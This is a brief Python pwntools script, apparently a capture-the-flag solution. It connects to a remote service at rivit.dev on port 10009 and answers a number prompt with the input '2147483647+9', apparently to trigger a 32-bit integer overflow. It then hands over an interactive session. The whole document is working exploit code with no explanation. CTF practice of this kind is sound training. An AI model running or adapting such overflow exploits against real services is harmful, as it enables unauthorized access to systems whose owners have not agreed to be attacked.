from pwn import *
payload=b"2147483647+9"
r=remote("rivit.dev",10009)
r.sendlineafter(b'number:',payload)
r.interactive()
